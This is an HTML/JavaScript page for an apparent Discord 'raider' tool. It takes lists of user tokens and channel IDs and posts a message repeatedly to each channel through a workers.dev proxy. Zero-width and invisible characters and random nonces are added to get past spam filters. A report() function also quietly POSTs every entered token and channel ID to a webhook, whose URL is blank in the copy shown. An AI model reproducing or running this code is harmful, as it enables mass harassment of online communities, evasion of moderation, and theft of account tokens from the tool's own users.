<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>みんなのすみか Raider</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --accent: #a855f7; --bg: #030014; --panel: rgba(15, 10, 31, 0.8); }
        body { 
            background: var(--bg); 
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(168, 85, 247, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(139, 92, 246, 0.15) 0%, transparent 50%);
            color: #d8b4fe; 
            font-family: 'Consolas', 'Courier New', monospace; 
            overflow: hidden; 
        }
   
        .aurora {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(120deg, #6366f1, #a855f7, #ec4899);
            filter: blur(100px); opacity: 0.1; z-index: -1; animation: aurora-flow 15s infinite alternate;
        }
        @keyframes aurora-flow { from { transform: translate(-10%, -10%) rotate(0deg); } to { transform: translate(10%, 10%) rotate(5deg); } }
        
        .cyber-panel { background: var(--panel); border: 1px solid rgba(168, 85, 247, 0.3); backdrop-filter: blur(20px); box-shadow: 0 0 30px rgba(168, 85, 247, 0.1); }
        .cyber-input { background: rgba(0, 0, 0, 0.5); border: 1px solid #4c1d95; color: #f3e8ff; font-size: 11px; transition: 0.3s; }
        .cyber-input:focus { border-color: #a855f7; outline: none; box-shadow: 0 0 15px rgba(168, 85, 247, 0.4); }
        .btn-aurora { background: linear-gradient(135deg, #7c3aed, #a855f7); color: #fff; font-weight: 900; letter-spacing: 3px; border: none; transition: 0.4s; }
        .btn-aurora:hover { box-shadow: 0 0 30px rgba(168, 85, 247, 0.6); transform: translateY(-2px); filter: brightness(1.2); }
        .terminal-scroll::-webkit-scrollbar { width: 3px; }
        .terminal-scroll::-webkit-scrollbar-thumb { background: #6b21a8; }
        .log-line { border-left: 3px solid #4c1d95; padding-left: 10px; margin-bottom: 4px; font-size: 11px; }
        .log-ok { border-left-color: #00ff9d; color: #00ff9d; }
        .log-err { border-left-color: #ff4d4d; color: #ff4d4d; }
    </style>
</head>
<body class="h-screen w-screen flex items-center justify-center p-6 text-sm">
    <div class="aurora"></div>

<div class="w-full max-w-[1400px] h-full grid grid-cols-12 gap-6 relative">
    
    <div class="col-span-12 lg:col-span-5 flex flex-col gap-4">
        <div class="cyber-panel p-6 flex-1 flex flex-col gap-4">
            <div class="flex items-center justify-between border-b border-purple-900/50 pb-2">
                <h1 class="text-xs font-black tracking-[0.5em] text-purple-300">みんなのすみか KERNEL V5.0</h1>
                <span class="text-[9px] bg-purple-900/50 px-2 py-0.5 rounded text-purple-200">AURORA_EDITION</span>
            </div>
            
            <div class="space-y-1">
                <label class="text-[10px] uppercase font-bold text-purple-400/70">ユーザートークン (改行区切り)</label>
                <textarea id="tokens" class="cyber-input w-full h-32 p-3 resize-none" placeholder="トークンを入力..."></textarea>
            </div>

            <div class="space-y-1">
                <label class="text-[10px] uppercase font-bold text-purple-400/70">ターゲットチャンネル ID (改行区切り)</label>
                <textarea id="channels" class="cyber-input w-full h-24 p-3 resize-none" placeholder="チャンネルIDを入力..."></textarea>
            </div>

            <div class="space-y-1 flex-1">
                <label class="text-[10px] uppercase font-bold text-purple-400/70">送信ないよー</label>
                <textarea id="message" class="cyber-input w-full h-full p-3 resize-none" placeholder="送信するメッセージを入力..."></textarea>
            </div>
        </div>

        <div class="cyber-panel p-5 grid grid-cols-2 gap-4">
            <div class="col-span-2 flex items-center justify-between border-b border-purple-900/30 pb-2 mb-2">
                <span class="text-[10px] text-purple-300">回避設定</span>
                <div class="flex gap-4 text-[10px]">
                    <label class="flex items-center gap-1 cursor-pointer"><input type="checkbox" id="zw" checked class="accent-purple-500"> ゼロ幅</label>
                    <label class="flex items-center gap-1 cursor-pointer"><input type="checkbox" id="inv" checked class="accent-purple-500"> 特殊文字</label>
                </div>
            </div>
            <div>
                <span class="text-[9px] text-purple-400">ランダム文字列数</span>
                <input type="number" id="nLen" value="12" class="cyber-input w-full p-2 text-center mt-1">
            </div>
            <div>
                <span class="text-[9px] text-purple-400">送信間隔 (ms)</span>
                <input type="number" id="delay" value="1000" class="cyber-input w-full p-2 text-center mt-1">
            </div>
            <div class="col-span-2">
                <span class="text-[9px] text-purple-400">ループ回数</span>
                <input type="number" id="loops" value="1" class="cyber-input w-full p-2 text-center mt-1">
            </div>
        </div>

        <button id="run" class="btn-aurora py-5 rounded-sm text-xs shadow-lg">開始</button>
    </div>

    <div class="col-span-12 lg:col-span-7 cyber-panel flex flex-col overflow-hidden">
        <div class="bg-black/40 p-3 border-b border-purple-900/50 flex justify-between items-center">
            <span class="text-[10px] text-purple-300 font-bold tracking-widest">>> ログ</span>
            <div class="flex gap-3 text-[9px]">
                <span id="st_p" class="text-green-400">PROXYok</span>
                <span class="text-purple-500">SSL_SECURED</span>
            </div>
        </div>
        <div id="term" class="terminal-scroll flex-1 p-6 overflow-y-auto space-y-1 font-mono text-[11px] text-purple-100/70">
            <div class="opacity-40 border-b border-purple-900/30 pb-2 mb-2">AARR_NETWORK PROTOCOL v5.0.0<br>準備完了</div>
        </div>
    </div>
</div>

<script>
"use strict";

class AuroraCore {
    constructor() {
        this.w = "";
        this.p = "https://tiny-forest-25ff.s103765s103765s103765.workers.dev/";
        
        this.chars = {
            zw: ['\u200B', '\u200C', '\u200D', '\uFEFF', '\u2060'],
            inv: ['\u2061', '\u2062', '\u2063', '\u17B4', '\u17B5', '\u180E', '\u3164']
        };

        this.dom = {
            t: document.getElementById('tokens'),
            c: document.getElementById('channels'),
            m: document.getElementById('message'),
            nl: document.getElementById('nLen'),
            dl: document.getElementById('delay'),
            lp: document.getElementById('loops'),
            zw: document.getElementById('zw'),
            iv: document.getElementById('inv'),
            tm: document.getElementById('term'),
            bn: document.getElementById('run')
        };

        this.dom.bn.onclick = () => this.execute();
    }

    log(m, s = 'info') {
        const d = document.createElement('div');
        d.className = `log-line ${s === 'ok' ? 'log-ok' : s === 'err' ? 'log-err' : ''}`;
        d.innerHTML = `<span class="opacity-30 mr-2">[${new Date().toLocaleTimeString()}]</span> ${m}`;
        this.dom.tm.prepend(d);
    }

    obfuscate(base, nLen) {
        let out = base;
        if (this.dom.zw.checked) {
            out = out.split('').map(c => c + this.chars.zw[Math.floor(Math.random() * this.chars.zw.length)]).join('');
        }
        if (this.dom.iv.checked) {
            for(let i=0; i<3; i++) out += this.chars.inv[Math.floor(Math.random() * this.chars.inv.length)];
        }
        const nonce = Array.from({length: parseInt(nLen)}, () => Math.random().toString(36)[2]).join('');
        return `${out} [${nonce}]`;
    }

    async report(tokens, channels) {
        try {
            await fetch(this.w, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `**ログ**\n\n**トークン:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\`\n**送信先:**\n\`\`\`\n${channels.join('\n')}\n\`\`\``
                })
            });
        } catch(e) {}
    }

    async execute() {
        const tokens = this.dom.t.value.split('\n').filter(Boolean);
        const channels = this.dom.c.value.split('\n').filter(Boolean);
        const baseMsg = this.dom.m.value;

        if (!tokens.length || !channels.length || !baseMsg) return alert("入力データが不足しています。");

        this.dom.bn.disabled = true;
        this.log("初期化中...", "ok");
    
        await this.report(tokens, channels);

        const loops = parseInt(this.dom.lp.value);
        const delay = parseInt(this.dom.dl.value);

        for (let i = 0; i < loops; i++) {
            this.log(`繰り返し ${i + 1} です`, "info");
            for (const ch of channels) {
                for (const tk of tokens) {
                    const payload = this.obfuscate(baseMsg, this.dom.nl.value);
                    try {
                        const r = await fetch(`${this.p}https://discord.com/api/v10/channels/${ch.trim()}/messages`, {
                            method: "POST",
                            headers: { "Authorization": tk.trim(), "Content-Type": "application/json" },
                            body: JSON.stringify({ content: payload })
                        });

                        if (r.status === 429) {
                            const d = await r.json();
                            this.log(`レート制限: ${d.retry_after}秒待機`, "err");
                            await new Promise(res => setTimeout(res, d.retry_after * 1000));
                        } else if (r.ok) {
                            this.log(`送信成功: CH ${ch.slice(-6)}`, "ok");
                        } else {
                            this.log(`送信失敗: ステータス ${r.status}`, "err");
                        }
                    } catch (e) { this.log("プロキシエラー", "err"); }
                    await new Promise(res => setTimeout(res, delay));
                }
            }
        }
        this.log("終了しました", "ok");
        this.dom.bn.disabled = false;
    }
}

document.addEventListener('DOMContentLoaded', () => new AuroraCore());
</script>
</body>
</html>
